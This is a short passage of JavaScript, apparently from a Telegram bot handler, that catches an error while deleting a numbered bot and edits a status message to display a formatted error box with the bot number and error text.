    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});


